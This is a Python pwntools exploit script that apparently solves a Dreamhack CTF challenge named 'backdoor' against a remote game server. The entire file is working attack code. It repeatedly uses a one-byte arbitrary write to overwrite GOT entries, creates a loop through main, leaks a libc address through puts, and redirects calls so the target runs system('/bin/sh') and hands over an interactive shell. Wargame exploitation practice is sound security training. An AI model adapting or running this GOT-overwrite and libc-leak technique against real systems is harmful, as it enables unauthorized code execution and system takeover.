from pwn import *
# context(log_level='debug')

REMOTE = True

if not REMOTE:
    r = process('./release/backdoor')
    __libc_start_main_offset = 0x21ba0
    system_offset = 0x4f420
    binsh_offset = 0x1b3d88
else:
    r = remote('host1.dreamhack.games', 19453)
    __libc_start_main_offset = 0x21b10
    system_offset = 0x4f550
    binsh_offset = 0x1b3e1a

# ex) 1234 -> '4321'
def reverse(n):
    result = ''

    digits = 0
    while 1:
        if int(n / (10 ** digits)) == 0:
            break
        else:
            digits += 1
    
    for digit in range(digits):
        number = int(n / (10 ** (digits - digit - 1)))
        result = str(number) + result
        n %= (10 ** (digits - digit - 1))

    return result

# write 1byte value on addr
def aaw(addr, value):
    r.sendline(str(reverse(value)))
    r.sendline(str(reverse(addr)))

main = 0x4005d3 # main()
no_brute = 0x400590 # no_brute()
puts_plt = 0x400540 # PLT of puts()
puts_got = 0x600bc0 # GOT of puts()
__libc_start_main_got = 0x600b98 # GOT of __libc_start_main()
__stack_chk_fail_got = 0x600bc8 # GOT of __stack_chk_fail()
setbuf_got = 0x600bd0 # GOT of setbuf()
sleep_got = 0x600be0 # GOT of sleep()
stdout = 0x600c00 # global var <stdout>


# make loop

# sleep() -> main+0x23
aaw(sleep_got, (main + 0x23) & 0xff)

# __stack_chk_fail() -> main+0x23
aaw(__stack_chk_fail_got, (main + 0x23) & 0xff)

# puts() -> main+0x33
aaw(puts_got, (main + 0x33) & 0xff)
aaw(puts_got + 1, ((main + 0x33) & 0xff00) >> 8)

# __stack_chk_fail() -> no_brute+0x3e (jmp puts@plt -> main+0x33)
aaw(__stack_chk_fail_got, (no_brute + 0x3e) & 0xff)


# leak libc

# setbuf() -> puts@plt+6 -> puts()
for offset in range(8):
    aaw(setbuf_got + offset, ((puts_plt + 6) & (0xff << (8 * offset))) >> (8 * offset))

# stdout ->  __libc_start_main@got
for offset in range(8):
    aaw(stdout + offset, (__libc_start_main_got & (0xff << (8 * offset))) >> (8 * offset))

# setbuf(stdout) -> puts(__libc_start_main@got)
aaw(__stack_chk_fail_got, main + 0x23)

__libc_start_main = u64(r.recvline()[:-1].ljust(8, b'\x00')) # __libc_start_main()
libc = __libc_start_main - __libc_start_main_offset # libc base
system = libc + system_offset # system()
binsh = libc + binsh_offset # "/bin/sh"


# call system("/bin/sh")

# sleep() -> main+0x33
aaw(sleep_got, (main + 0x33) & 0xff)
aaw(sleep_got + 1, ((main + 0x33) & 0xff00) >> 8)

# __stack_chk_fail() -> no_brute+0x19 (call sleep() -> main+0x33)
aaw(__stack_chk_fail_got, (no_brute + 0x19) & 0xff)

# puts() -> system()
for offset in range(8):
    aaw(puts_got + offset, (system & (0xff << (8 * offset))) >> (8 * offset))

# setbuf() -> no_brute+0x3a (add rsp,0x18; jmp puts@plt) (for stack alignment)
aaw(setbuf_got, (no_brute + 0x3a) & 0xff)

# stdout -> "/bin/sh"
for offset in range(8):
    aaw(stdout + offset, (binsh & (0xff << (8 * offset))) >> (8 * offset))

# __stack_chk_fail() -> main+0x23 -> setbuf(stdout) -> system("/bin/sh")
aaw(__stack_chk_fail_got, (main + 0x23) & 0xff)


r.interactive()